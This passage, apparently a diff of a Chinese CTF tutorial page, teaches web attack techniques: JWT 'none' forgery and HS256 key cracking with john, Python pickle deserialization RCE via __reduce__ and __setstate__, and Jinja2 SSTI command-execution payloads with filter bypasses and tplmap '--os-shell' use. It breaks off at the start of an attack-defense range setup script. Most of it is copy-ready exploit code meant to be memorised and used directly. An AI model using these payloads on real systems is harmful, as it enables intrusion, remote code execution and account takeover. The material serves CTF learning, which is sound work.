+</div><p>直接用 <strong>none 攻击</strong> 秒解！</p>
+</li>
+<li>
+<p>四、JWT 密钥爆破实战（HS256 爆破）</p>
+<ul>
+<li>
+<ol>
+<li>原理
+JWT 使用 <strong>HS256（HMAC-SHA256）</strong> 签名，需要密钥。
+CTF 里密钥经常是弱口令：
+<code>123456</code>、<code>admin</code>、<code>root</code>、<code>test</code>、<code>password</code>、<code>secret</code></li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>工具：john the ripper 一键爆破</li>
+</ol>
+<ul>
+<li>爆破命令（直接用）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john jwt.txt --wordlist<span class="o">=</span>密码字典.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>步骤
+<ol>
+<li>把 JWT Token 保存到 <code>jwt.txt</code></li>
+<li>运行爆破</li>
+<li>跑出密钥后，去 jwt.io 重新签名</li>
+<li>替换 Token → 拿 Flag</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>常见弱密钥（CTF 90% 都在这里）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">secret
+</span></span><span class="line"><span class="cl">123456
+</span></span><span class="line"><span class="cl">password
+</span></span><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">test
+</span></span><span class="line"><span class="cl">12345678
+</span></span><span class="line"><span class="cl">guest
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>五、CTF JWT 解题万能模板</p>
+<ul>
+<li>模板 1：空加密算法（None attack）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Header</span><span class="p">:</span> <span class="n">alg</span><span class="p">:</span><span class="n">none</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Signature</span><span class="p">:</span> <span class="err">留空</span> <span class="o">+</span> <span class="err">末尾加</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>模板 2：HS256 密钥爆破</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">抓Token → john爆破 → 拿到密钥 → 重签 → 替换发包
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>模板 3：修改权限</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uid=0 → uid=1
+</span></span><span class="line"><span class="cl">isadmin=0 → isadmin=1
+</span></span><span class="line"><span class="cl">role=user → role=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>超简总结</p>
+<ol>
+<li><strong>JWT = Header.Payload.Signature</strong></li>
+<li><strong>抓包看到 Bearer 开头 → 就是 JWT</strong></li>
+<li><strong>改 admin 是核心目标</strong></li>
+<li><strong>无签名攻击（none）最简单</strong></li>
+<li><strong>HS256 直接用 john 爆破弱密钥</strong></li>
+<li><strong>重新签名 → 替换 Token → 拿 Flag</strong></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>python反序列化实战<br>
+这是 <strong>CTF Web / 杂项 / Pwn 都可能考</strong>的<strong>高难度、高分值</strong>题型，核心就是：
+<strong>Python pickle 反序列化 → 代码执行 / RCE</strong>
+<ul>
+<li>
+<p>一、前置核心知识（必须懂）</p>
+<ul>
+<li>
+<ol>
+<li>什么是 Python 反序列化？</li>
+</ol>
+<ul>
+<li><code>pickle.dumps(obj)</code> → <strong>序列化</strong>（对象→字符串）</li>
+<li><code>pickle.loads(str)</code> → <strong>反序列化</strong>（字符串→对象）</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>高危点
+<strong>只要可控数据进入 <code>pickle.loads()</code>，100% 能 RCE！</strong></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>二、三个核心魔术方法（做题全靠它们）</p>
+<ul>
+<li>
+<ol>
+<li><code>__reduce__</code>（最常用、最强、RCE 首选）
+<strong>反序列化时自动执行！</strong>
+用来返回一个 <strong>(函数, 参数元组)</strong>，反序列化时会自动调用。</li>
+</ol>
+</li>
+<li>实战 RCE Payload（直接背）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EXP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 返回 (要执行的函数, (参数,))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 生成恶意序列化字符串</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EXP</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li><code>__reduce_ex__</code>（升级版，优先级更高）
+和 <code>__reduce__</code> 一模一样，<strong>优先级更高</strong>，过滤 <code>__reduce__</code> 时用。</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__reduce_ex__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proto</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">,))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li><code>__setstate__</code> + <code>__getstate__</code>（状态劫持）</li>
+</ol>
+</li>
+<li>逻辑：
+<ol>
+<li><code>__getstate__</code>：序列化时<strong>保存什么数据</strong></li>
+<li><code>__setstate__</code>：反序列化时<strong>自动执行</strong>，传入保存的数据</li>
+</ol>
+</li>
+<li>实战 RCE 写法</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EXP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__getstate__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 要被存储的内容</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;test&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__setstate__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 反序列化自动执行！</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EXP</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>只要触发反序列化，自动 RCE！</strong></p>
+</li>
+<li>
+<p>三、最简单区分（做题优选）</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+<th>优先级</th>
+<th>场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__reduce__</code></td>
+<td>执行命令/函数</td>
+<td>中</td>
+<td><strong>CTF 首选，90% 用它</strong></td>
+</tr>
+<tr>
+<td><code>__reduce_ex__</code></td>
+<td>同上</td>
+<td>高</td>
+<td>过滤 <code>__reduce__</code> 时用</td>
+</tr>
+<tr>
+<td><code>__setstate__</code></td>
+<td>接收状态并执行</td>
+<td>中</td>
+<td>代码里出现 <code>getstate/setstate</code> 时用</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>
+<p>四、CTF 真实题目模板（直接秒解）</p>
+<ul>
+<li>题目代码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 高危！可控反序列化</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;ok&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>攻击方法<br>
+直接生成 Payload：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span><span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EXP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EXP</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>放到 cookie 里，<strong>直接拿 Flag！</strong></p>
+</li>
+<li>
+<p>五、超简总结</p>
+<ul>
+<li>
+<ol>
+<li>看到什么考这个？</li>
+</ol>
+<ul>
+<li><code>pickle.loads()</code></li>
+<li><code>data</code> 来自用户输入（cookie、get、post）</li>
+<li>字符串长得像：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b&#39;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<ol start="2">
+<li>做题万能模板（直接写）</li>
+</ol>
+<ul>
+<li>模板 A：<strong>reduce</strong>（首选）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">,))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>模板 B：<strong>setstate</strong></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__setstate__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<ol start="3">
+<li>核心口诀
+<strong>可控反序列化 = 直接 RCE</strong>
+<strong>reduce 执行命令，setstate 自动触发</strong>&lt;&gt;</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Python pickle 反序列化只要可控，100% 命令执行，是 CTF 送分题（也是大分题）！</strong></p>
+</li>
+</ul>
+</li>
+<li>python  SSTI模板注入实战——&gt;自动化SSTI工具<br>
+这是 <strong>CTF Web 最常考、最简单、最容易拿分</strong> 的题型！
+<ul>
+<li>一、SSTI 是什么？
+<ul>
+<li>一句话
+<strong>SSTI = 服务器模板注入 = 让你把恶意代码写进模板里执行 → 直接RCE拿Flag</strong></li>
+<li>常见模板引擎
+<ul>
+<li>Jinja2（Flask）</li>
+<li>Tornado</li>
+<li>Django</li>
+<li>Smarty
+<strong>CTF 99%考 Flask + Jinja2</strong></li>
+</ul>
+</li>
+<li>触发点
+只要看到页面接收参数并回显，比如：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={{7*7}}
+</span></span><span class="line"><span class="cl">页面返回：49
+</span></span><span class="line"><span class="cl">✅ 100% 存在 SSTI！
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>二、SSTI 最常用 Payload（可直接用）
+<ul>
+<li>
+<ol>
+<li>基础判断</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{7*7}}
+</span></span><span class="line"><span class="cl">{{config}}
+</span></span><span class="line"><span class="cl">{{self}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>读文件</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{open(&#39;/flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>命令执行（最常用）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>无过滤通用Payload</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>三、SSTI 过滤绕过（比赛必备）
+<ul>
+<li>
+<ol>
+<li>过滤 _</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{request|attr([&#39;__cl&#39;+&#39;ass__&#39;])}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>过滤引号</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{()|attr(request.args.a)|attr(request.args.b)(request.args.c)}}
+</span></span><span class="line"><span class="cl">?a=__class__&amp;b=__base__&amp;c=__subclasses__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>过滤数字</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{()|attr([&#39;__cl&#39;+&#39;ass__&#39;])|attr([&#39;__bas&#39;+&#39;e__&#39;])|attr([&#39;__subcl&#39;+&#39;asses__&#39;])().pop()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>四、自动化 SSTI 工具（CTF神器！）
+<ul>
+<li>
+<ol>
+<li>Tplmap（最强SSTI自动化工具）</li>
+</ol>
+</li>
+<li>安装</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/epinna/tplmap
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> tplmap
+</span></span><span class="line"><span class="cl">pip install -r requirements.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>一键检测 + 一键拿Shell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python tplmap.py -u <span class="s2">&#34;http://xxx?name=*&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>直接反弹Shell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python tplmap.py -u <span class="s2">&#34;http://xxx?name=*&#34;</span> --os-shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><strong>自动判断注入、自动绕WAF、自动执行命令！</strong>
+<ul>
+<li>
+<ol start="2">
+<li>CT FFTool（SSTI一键Payload生成）
+支持：</li>
+</ol>
+<ul>
+<li>Jinja2</li>
+<li>Tornado</li>
+<li>过滤绕过</li>
+<li>一键生成Payload</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>Burp Suite 插件</li>
+</ol>
+<ul>
+<li><strong>SSTI Scanner</strong></li>
+<li>自动扫描、自动检测、自动回显flag</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>五、SSTI 解题流程（10秒拿分）
+<ol>
+<li>输入 <code>{{7*7}}</code> → 回显49 → 确认SSTI</li>
+<li>输入 <code>{{config}}</code> → 看是否有过滤</li>
+<li>无过滤：直接用</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>有过滤：用 <strong>tplmap</strong> 一键自动化</li>
+<li>直接出Flag！</li>
+</ol>
+</li>
+<li>超简总结（背会直接拿分）
+<ol>
+<li><code>{{7*7}}=49</code> → SSTI</li>
+<li>无过滤直接用：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>有过滤 → <strong>tplmap 一键自动化</strong></li>
+<li>读文件 / 执行命令 / 拿flag</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="三攻防模式">三、攻防模式
+</h2><ul>
+<li>攻防模式（Attack-Defense）靶场实战搭建指南<br>
+这是 <strong>CTF 线下决赛/高强度模拟</strong>的核心环境！<br>
+相比解题模式，<strong>攻防模式更接近真实黑客对抗</strong>：你既要防守自己的服务器不被打挂，又要攻击对手服务器拿 Flag。
+<ul>
+<li>
+<p>一、核心架构介绍（必看）</p>
+<ul>
+<li>
+<ol>
+<li>三大角色
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:left">角色</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">部署建议</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>裁判/调度端</strong></td>
+<td style="text-align:left">分发靶机、计时、判分、控制流量</td>
+<td style="text-align:left">1 台服务器（独立公网IP）</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>攻击方</strong></td>
+<td style="text-align:left">打别人、防自己、拿Flag</td>
+<td style="text-align:left">参赛队伍本地/Kali虚拟机</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>靶机</strong></td>
+<td style="text-align:left">被攻击的漏洞服务器（每队1台/共享）</td>
+<td style="text-align:left">多台虚拟机/云主机</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>主流方案对比
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:left">方案</th>
+<th style="text-align:left">优点</th>
+<th style="text-align:left">缺点</th>
+<th style="text-align:left">推荐场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>CTFd + AWD插件</strong></td>
+<td style="text-align:left">开源、轻量、易部署</td>
+<td style="text-align:left">原生功能弱</td>
+<td style="text-align:left"><strong>个人/新手练习</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Django-AWD</strong></td>
+<td style="text-align:left">功能全、判分逻辑清晰</td>
+<td style="text-align:left">部署稍复杂</td>
+<td style="text-align:left"><strong>团队/校级比赛</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>攻防世界/攻防演练平台</strong></td>
+<td style="text-align:left">一键部署、可视化强</td>
+<td style="text-align:left">私有化难</td>
+<td style="text-align:left"><strong>官方大型赛事</strong></td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ol>
+</li>
+</ul>
+<p><strong>搭：CTFd + AWD插件（最简单、最通用）</strong></p>
+</li>
+<li>
+<p>二、第一步：搭建裁判/调度端（核心）</p>
+<ul>
+<li>环境准备
+<ul>
+<li>系统：<strong>Ubuntu 20.04/22.04</strong>（云服务器/本地虚拟机均可）</li>
+<li>内存：≥2G</li>
+<li>网络：公网IP（云服务器）/内网互通（本地）</li>
+</ul>
+</li>
+<li>一键安装脚本（直接复制）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1. 安装依赖</span>
+</span></span><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install -y git python3 python3-pip python3-venv docker.io docker-compose
+</span></span><span class="line"><span class="cl">
